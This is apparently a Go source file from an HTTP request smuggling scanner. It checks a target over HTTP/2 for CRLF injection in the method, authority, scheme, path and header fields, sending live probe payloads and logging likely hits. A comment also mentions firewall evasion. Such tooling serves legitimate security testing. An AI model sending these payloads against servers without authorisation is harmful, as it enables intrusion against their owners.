package smuggler

import (
	"smuggler/config"
	"smuggler/smuggler/h2"
	"smuggler/utils"

	"github.com/rs/zerolog/log"
)

type Tunnel struct {
	*DesyncerImpl

	hdr map[string][]string
}

type tName struct {
	name      string
	test      string
	confirm   string
	modifyReq func(*h2.Request, string)
}

func (t *Tunnel) Run() bool {
	if config.Glob.Concurrent {
		defer t.Wg.Done()
	}

	if !t.H2Supported {
		return false
	}

	t.hdr = make(map[string][]string)
	t.hdr = utils.CloneMap(t.Hdr)
	for k, vv := range config.Glob.Hdr {
		t.hdr[k] = append(t.hdr[k], vv[0])
	}

	baseReq := func() *h2.Request {
		url := *t.URL
		return &h2.Request{
			Method: t.Method,
			Hdrs:   t.hdr,
			URL:    &url,
		}
	}

	c := []tName{
		{
			name:    "method",
			test:    "GET / HTTP/1.1\r\nFoo: bar",
			confirm: "GET / HTTP/1.1\r\nHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Method = p
			},
		},
		{
			name:    "authority",
			test:    "\r\nFoo: bar",
			confirm: "\r\rHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.URL.Host += p
			},
		},
		{
			name:    "scheme",
			test:    "\r\nFoo: bar",
			confirm: "\r\rHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.URL.Scheme += p
			},
		},
		{
			name:    "path",
			test:    "a=b HTTP/1.1\r\nFoo: bar",
			confirm: "a=b HTTP/1.1\r\nHost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				utils.AppendQueryParam(r.URL, p)
			},
		},
		{
			name:    "custom header key",
			test:    "foo: bar\r\nx-my-hdr: x-val",
			confirm: "foo: bar\r\nhost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Hdrs = utils.CloneMap(t.hdr)
				r.Hdrs[p] = []string{"bar"}
			},
		},
		{
			name:    "custom header value",
			test:    "bar\r\nx-my-hdr: x-val",
			confirm: "bar\r\nhost: thisisadummyhost\r\n\r\n",
			modifyReq: func(r *h2.Request, p string) {
				r.Hdrs = utils.CloneMap(t.hdr)
				r.Hdrs["foo"] = []string{p}
			},
		},
	}

	// might add more payloads (crlf sequence for waf evasion)
	transport := h2.Transport{}
	log.Info().
		Str("endpoint", t.URL.String()).
		Msg("Running H2 tunneling tests")
	for _, v := range c {
		req := baseReq()
		v.modifyReq(req, v.test)
		resp, err := transport.RoundTrip(req)
		if err != nil {
			log.Debug().Err(err).Str("endpoint", req.URL.String()).Str("payload", v.test).Msg("")
			continue
		}
		resp.Body.Close()

		if resp.StatusCode >= 400 {
			log.Debug().
				Str("endpoint", t.URL.String()).
				Msgf("response received with %s", resp.Status)
			continue
		}

		req = baseReq()
		v.modifyReq(req, v.confirm)
		resp, err = transport.RoundTrip(req)
		if err != nil {
			log.Debug().
				Str("endpoint", t.URL.String()).
				Err(err).Msg("")
			continue
		}
		resp.Body.Close()

		if resp.StatusCode < 400 { // expect an error as Hostname is invalid
			continue
		}
		log.Info().
			Str("endpoint", t.URL.String()).
			Int("status", resp.StatusCode).
			Msgf("%s injection might be interesting", v.name)
	}
	return false
}
